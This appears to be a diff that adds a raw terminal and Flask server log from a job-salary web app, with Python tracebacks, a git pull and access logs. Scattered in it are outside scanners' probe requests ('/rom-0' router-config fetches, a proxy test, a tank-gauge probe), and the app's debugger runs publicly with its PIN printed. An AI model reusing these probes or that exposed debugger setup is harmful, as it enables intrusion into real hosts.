@@ -1,0 +1,1317 @@
+n wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1540, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1982, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1614, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1517, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1612, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1598, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/dice_codingskills_project/app/app.py", line 55, in get_words
+    jobs = ca.get_jobs(search_term=search_term, fields=fields)
+  File "/home/ubuntu/dice_codingskills_project/dice_code/collect_api.py", line 1700, in get_jobs
+    jobs = list(coll.find({'recent': True}, field_dict))
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/cursor.py", line 1114, in next
+    if len(self.__data) or self._refresh():
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/cursor.py", line 1036, in _refresh
+    self.__collation))
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/cursor.py", line 926, in __send_message
+    codec_options=self.__codec_options)
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/helpers.py", line 137, in _unpack_response
+    error_object)
+OperationFailure: database error: interrupted at shutdown
+76.120.28.108 - - [19/May/2017 07:11:47] "POST /get_job_stats HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1994, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1985, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1540, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1982, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1614, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1517, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1612, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1598, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/dice_codingskills_project/app/app.py", line 55, in get_words
+    jobs = ca.get_jobs(search_term=search_term, fields=fields)
+  File "/home/ubuntu/dice_codingskills_project/dice_code/collect_api.py", line 1700, in get_jobs
+    jobs = list(coll.find({'recent': True}, field_dict))
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/cursor.py", line 1114, in next
+    if len(self.__data) or self._refresh():
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/cursor.py", line 1036, in _refresh
+    self.__collation))
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/cursor.py", line 873, in __send_message
+    **kwargs)
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/mongo_client.py", line 905, in _send_message_with_response
+    exhaust)
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/mongo_client.py", line 916, in _reset_on_error
+    return func(*args, **kwargs)
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/server.py", line 136, in send_message_with_response
+    response_data = sock_info.receive_message(1, request_id)
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/pool.py", line 452, in receive_message
+    self._raise_connection_failure(error)
+  File "/usr/local/lib/python2.7/dist-packages/pymongo/pool.py", line 552, in _raise_connection_failure
+    raise error
+AutoReconnect: connection closed
+
+ubuntu@ip-172-31-14-120:~/dice_codingskills_project$
+ubuntu@ip-172-31-14-120:~/dice_codingskills_project$
+ubuntu@ip-172-31-14-120:~/dice_codingskills_project$ fg
+-bash: fg: current: no such job
+ubuntu@ip-172-31-14-120:~/dice_codingskills_project$ python app/app.py
+system path
+['/home/ubuntu/dice_codingskills_project/app', '/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg', '/usr/l
+ocal/lib/python2.7/dist-packages/xgboost-0.6-py2.7.egg', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk'
+, '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/home/ubuntu/.local/lib/python2.7/site-packages', '/usr/local/lib/python2.7/dist-pa
+ckages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/PILcompat', '/usr/lib/python2.7/dist-packages/gtk-2.0', '/usr/lib/pytho
+n2.7/dist-packages/wx-3.0-gtk2']
+/usr/lib/python2.7/dist-packages/gtk-2.0/gtk/__init__.py:57: GtkWarning: could not open display
+  warnings.warn(str(e), _gtk.Warning)
+/usr/local/lib/python2.7/dist-packages/IPython/html.py:14: ShimWarning: The `IPython.html` package has been deprecated. You should import from `notebo
+ok` instead. `IPython.html.widgets` has moved to `ipywidgets`.
+  "`IPython.html.widgets` has moved to `ipywidgets`.", ShimWarning)
+/usr/local/lib/python2.7/dist-packages/bokeh/util/deprecation.py:34: BokehDeprecationWarning: bokeh.properties was deprecated in Bokeh 0.11.0 and will
+ be removed, use bokeh.core.properties instead.
+  warn(message)
+ * Running on http://0.0.0.0:10001/ (Press CTRL+C to quit)
+ * Restarting with stat
+system path
+['/home/ubuntu/dice_codingskills_project/app', '/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg', '/usr/l
+ocal/lib/python2.7/dist-packages/xgboost-0.6-py2.7.egg', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk'
+, '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/home/ubuntu/.local/lib/python2.7/site-packages', '/usr/local/lib/python2.7/dist-pa
+ckages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/PILcompat', '/usr/lib/python2.7/dist-packages/gtk-2.0', '/usr/lib/pytho
+n2.7/dist-packages/wx-3.0-gtk2']
+/usr/lib/python2.7/dist-packages/gtk-2.0/gtk/__init__.py:57: GtkWarning: could not open display
+  warnings.warn(str(e), _gtk.Warning)
+/usr/local/lib/python2.7/dist-packages/IPython/html.py:14: ShimWarning: The `IPython.html` package has been deprecated. You should import from `notebo
+ok` instead. `IPython.html.widgets` has moved to `ipywidgets`.
+  "`IPython.html.widgets` has moved to `ipywidgets`.", ShimWarning)
+/usr/local/lib/python2.7/dist-packages/bokeh/util/deprecation.py:34: BokehDeprecationWarning: bokeh.properties was deprecated in Bokeh 0.11.0 and will
+ be removed, use bokeh.core.properties instead.
+  warn(message)
+ * Debugger is active!
+ * Debugger pin code: 224-235-064
+76.120.28.108 - - [19/May/2017 07:12:07] "GET /search_jobs.html HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:07] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:07] "GET /js/pace.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:07] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:07] "GET /css/creative.min.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:07] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:07] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /css/morphist.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /css/animate.min.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /js/creative.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /js/app.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /js/morphist.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:08] "GET /img/header.jpg HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:09] "POST /send_user_info HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:09] "GET /favicon.ico HTTP/1.1" 200 -
+/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg/matplotlib/cbook/deprecation.py:106: MatplotlibDeprecatio
+nWarning: The GDK backend is deprecated. It is untested, known to be broken and will be removed in Matplotlib 2.2. Use the Agg backend instead. See Ma
+tplotlib usage FAQ for more info on backends. Use Agg instead.
+  warnings.warn(message, mplDeprecation, stacklevel=1)
+/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg/matplotlib/backends/backend_gdk.py:75: GtkWarning: IA__gd
+k_screen_get_default_colormap: assertion 'GDK_IS_SCREEN (screen)' failed
+  self._cmap = gtkDA.get_colormap()
+76.120.28.108 - - [19/May/2017 07:12:15] "POST /get_job_stats HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1994, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1985, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1540, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1982, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1614, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1517, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1612, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1598, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/dice_codingskills_project/app/app.py", line 68, in get_words
+    filename = ca.plot_salary_dist(search_term=search_term, hw=hw)
+  File "/home/ubuntu/dice_codingskills_project/dice_code/collect_api.py", line 1454, in plot_salary_dist
+    sal_dict = get_salary_dist(salary_dict, debug=debug)
+  File "/home/ubuntu/dice_codingskills_project/dice_code/collect_api.py", line 1346, in get_salary_dist
+    if 'hour' in s or 'hourly' in s or 'hr' in s or len(s) < 4 or ishourly and 'k' not in s:
+UnboundLocalError: local variable 'ishourly' referenced before assignment
+76.120.28.108 - - [19/May/2017 07:12:58] "GET /search_jobs.html HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:58] "GET /js/pace.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:58] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:58] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:58] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:58] "GET /css/creative.min.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:58] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /css/morphist.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /css/animate.min.css HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /js/creative.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /js/app.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /js/morphist.min.js HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:12:59] "GET /img/header.jpg HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:13:00] "GET /favicon.ico HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:13:00] "POST /send_user_info HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:13:04] "POST /get_job_stats HTTP/1.1" 500 -
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1994, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1985, in wsgi_app
+    response = self.handle_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1540, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1982, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1614, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1517, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1612, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/usr/local/lib/python2.7/dist-packages/flask/app.py", line 1598, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/dice_codingskills_project/app/app.py", line 68, in get_words
+    filename = ca.plot_salary_dist(search_term=search_term, hw=hw)
+  File "/home/ubuntu/dice_codingskills_project/dice_code/collect_api.py", line 1454, in plot_salary_dist
+    sal_dict = get_salary_dist(salary_dict, debug=debug)
+  File "/home/ubuntu/dice_codingskills_project/dice_code/collect_api.py", line 1346, in get_salary_dist
+    if 'hour' in s or 'hourly' in s or 'hr' in s or len(s) < 4 or ishourly and 'k' not in s:
+UnboundLocalError: local variable 'ishourly' referenced before assignment
+^C^C
+ubuntu@ip-172-31-14-120:~/dice_codingskills_project$ git pull
+Username for 'https://github.com': nateGeorge
+Password for 'https://nateGeorge@github.com':
+remote: Counting objects: 7, done.
+remote: Compressing objects: 100% (7/7), done.
+remote: Total 7 (delta 1), reused 0 (delta 0), pack-reused 0
+Unpacking objects: 100% (7/7), done.
+From https://github.com/nateGeorge/dice_codingskills_project
+   8a5e99a..beb6992  master     -> origin/master
+Updating 8a5e99a..beb6992
+Fast-forward
+ README.md                | 8 +++++++-
+ dice_code/collect_api.py | 1 +
+ 2 files changed, 8 insertions(+), 1 deletion(-)
+ubuntu@ip-172-31-14-120:~/dice_codingskills_project$ python app/app.py
+system path
+['/home/ubuntu/dice_codingskills_project/app', '/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg', '/usr/l
+ocal/lib/python2.7/dist-packages/xgboost-0.6-py2.7.egg', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk'
+, '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/home/ubuntu/.local/lib/python2.7/site-packages', '/usr/local/lib/python2.7/dist-pa
+ckages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/PILcompat', '/usr/lib/python2.7/dist-packages/gtk-2.0', '/usr/lib/pytho
+n2.7/dist-packages/wx-3.0-gtk2']
+/usr/lib/python2.7/dist-packages/gtk-2.0/gtk/__init__.py:57: GtkWarning: could not open display
+  warnings.warn(str(e), _gtk.Warning)
+/usr/local/lib/python2.7/dist-packages/IPython/html.py:14: ShimWarning: The `IPython.html` package has been deprecated. You should import from `notebo
+ok` instead. `IPython.html.widgets` has moved to `ipywidgets`.
+  "`IPython.html.widgets` has moved to `ipywidgets`.", ShimWarning)
+/usr/local/lib/python2.7/dist-packages/bokeh/util/deprecation.py:34: BokehDeprecationWarning: bokeh.properties was deprecated in Bokeh 0.11.0 and will
+ be removed, use bokeh.core.properties instead.
+  warn(message)
+ * Running on http://0.0.0.0:10001/ (Press CTRL+C to quit)
+ * Restarting with stat
+system path
+['/home/ubuntu/dice_codingskills_project/app', '/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg', '/usr/l
+ocal/lib/python2.7/dist-packages/xgboost-0.6-py2.7.egg', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk'
+, '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/home/ubuntu/.local/lib/python2.7/site-packages', '/usr/local/lib/python2.7/dist-pa
+ckages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/PILcompat', '/usr/lib/python2.7/dist-packages/gtk-2.0', '/usr/lib/pytho
+n2.7/dist-packages/wx-3.0-gtk2']
+/usr/lib/python2.7/dist-packages/gtk-2.0/gtk/__init__.py:57: GtkWarning: could not open display
+  warnings.warn(str(e), _gtk.Warning)
+/usr/local/lib/python2.7/dist-packages/IPython/html.py:14: ShimWarning: The `IPython.html` package has been deprecated. You should import from `notebo
+ok` instead. `IPython.html.widgets` has moved to `ipywidgets`.
+  "`IPython.html.widgets` has moved to `ipywidgets`.", ShimWarning)
+/usr/local/lib/python2.7/dist-packages/bokeh/util/deprecation.py:34: BokehDeprecationWarning: bokeh.properties was deprecated in Bokeh 0.11.0 and will
+ be removed, use bokeh.core.properties instead.
+  warn(message)
+ * Debugger is active!
+ * Debugger pin code: 224-235-064
+/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg/matplotlib/cbook/deprecation.py:106: MatplotlibDeprecatio
+nWarning: The GDK backend is deprecated. It is untested, known to be broken and will be removed in Matplotlib 2.2. Use the Agg backend instead. See Ma
+tplotlib usage FAQ for more info on backends. Use Agg instead.
+  warnings.warn(message, mplDeprecation, stacklevel=1)
+/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg/matplotlib/backends/backend_gdk.py:75: GtkWarning: IA__gd
+k_screen_get_default_colormap: assertion 'GDK_IS_SCREEN (screen)' failed
+  self._cmap = gtkDA.get_colormap()
+/usr/local/lib/python2.7/dist-packages/matplotlib-2.0.0+3158.g7b79174-py2.7-linux-x86_64.egg/matplotlib/tight_layout.py:218: UserWarning: tight_layout
+ : falling back to Agg renderer
+  warnings.warn("tight_layout : falling back to Agg renderer")
+img/data_science_scale_6_salary_dist.png
+76.120.28.108 - - [19/May/2017 07:14:24] "POST /get_job_stats HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:14:25] "GET /vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:14:25] "GET /img/data_science_scale_6_salary_dist.png?1495178065189 HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:14:25] "POST /send_user_info HTTP/1.1" 200 -
+76.120.28.108 - - [19/May/2017 07:14:58] "POST /filter_jobs HTTP/1.1" 200 -
+139.162.114.70 - - [19/May/2017 08:03:36] "GET / HTTP/1.1" 200 -
+91.196.50.33 - - [19/May/2017 08:50:47] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 -
+146.185.144.64 - - [19/May/2017 09:01:55] "GET / HTTP/1.1" 200 -
+80.82.77.139 - - [19/May/2017 11:08:36] code 400, message Bad request syntax ('\x01I20100')
+80.82.77.139 - - [19/May/2017 11:08:36] "I20100" 400 -
+52.67.109.80 - - [19/May/2017 11:18:15] "GET /rom-0 HTTP/1.1" 404 -
+54.153.156.156 - - [19/May/2017 13:35:17] "GET /rom-0 HTTP/1.1" 404 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET / HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /css/creative.min.css HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /css/morphist.css HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /css/animate.min.css HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /js/creative.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /js/morphist.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /img/header.jpg HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:31] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:32] "GET /favicon.ico HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:34] "GET /search_jobs.html HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:34] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:34] "GET /js/pace.min.js HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:34] "GET /js/app.js HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:34] "GET /js/bokeh_style.js HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:35] "POST /send_user_info HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+207.93.211.50 - - [19/May/2017 16:31:43] "POST /get_job_stats HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:43] "GET /vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:43] "GET /img/data_science_scale_6_salary_dist.png?1495211491777 HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:31:43] "POST /send_user_info HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:33:31] "GET / HTTP/1.1" 304 -
+207.93.211.50 - - [19/May/2017 16:33:48] "POST /send_user_info HTTP/1.1" 200 -
+150.70.173.56 - - [19/May/2017 16:33:49] "GET / HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:34:45] "POST /send_user_info HTTP/1.1" 200 -
+img/data_science_scale_6_salary_dist.png
+207.93.211.50 - - [19/May/2017 16:35:18] "POST /get_job_stats HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:35:19] "GET /img/data_science_scale_6_salary_dist.png?1495211707326 HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:35:19] "POST /send_user_info HTTP/1.1" 200 -
+img/ruby_on_rails_scale_6_salary_dist.png
+207.93.211.50 - - [19/May/2017 16:35:20] "POST /get_job_stats HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:35:20] "GET /img/ruby_on_rails_scale_6_salary_dist.png?1495211708806 HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:35:20] "POST /send_user_info HTTP/1.1" 200 -
+img/full_stack_scale_6_salary_dist.png
+207.93.211.50 - - [19/May/2017 16:36:46] "POST /get_job_stats HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:36:47] "GET /img/full_stack_scale_6_salary_dist.png?1495211795002 HTTP/1.1" 200 -
+207.93.211.50 - - [19/May/2017 16:36:47] "POST /send_user_info HTTP/1.1" 200 -
+img/analyst_scale_6_salary_dist.png
+207.93.211.50 - - [19/May/2017 16:38:00] "POST /get_job_stats HTTP/1.1" 200 -
+Error on request:
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 205, in run_wsgi
+    execute(self.server.app)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 196, in execute
+    write(data)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 177, in write
+    self.wfile.write(data)
+IOError: [Errno 32] Broken pipe
+img/analyst_scale_6_salary_dist.png
+207.93.211.50 - - [19/May/2017 16:39:15] "POST /get_job_stats HTTP/1.1" 200 -
+Error on request:
+Traceback (most recent call last):
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 205, in run_wsgi
+    execute(self.server.app)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 196, in execute
+    write(data)
+  File "/usr/local/lib/python2.7/dist-packages/werkzeug/serving.py", line 177, in write
+    self.wfile.write(data)
+IOError: [Errno 32] Broken pipe
+104.222.67.56 - - [19/May/2017 16:48:26] "GET / HTTP/1.0" 200 -
+150.70.173.21 - - [19/May/2017 17:05:49] "GET / HTTP/1.1" 200 -
+141.212.122.96 - - [19/May/2017 18:41:58] "GET / HTTP/1.1" 200 -
+64.58.20.112 - - [19/May/2017 22:28:52] "GET / HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:52] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:52] "GET /vendor/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:52] "GET /vendor/magnific-popup/magnific-popup.css HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:52] "GET /css/creative.min.css HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:52] "GET /css/morphist.css HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:52] "GET /css/animate.min.css HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:53] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:53] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:53] "GET /js/creative.min.js HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:53] "GET /vendor/scrollreveal/scrollreveal.min.js HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:53] "GET /vendor/magnific-popup/jquery.magnific-popup.min.js HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:53] "GET /js/morphist.min.js HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:53] "GET /img/header.jpg HTTP/1.1" 304 -
+64.58.20.112 - - [19/May/2017 22:28:53] "GET /vendor/font-awesome/fonts/fontawesome-webfont.woff2?v=4.6.3 HTTP/1.1" 304 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /search_jobs.html HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /css/pace_big_counter.css HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /js/pace.min.js HTTP/1.1" 200 -
+73.158.132.230 - - [20/May/2017 01:22:22] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 -
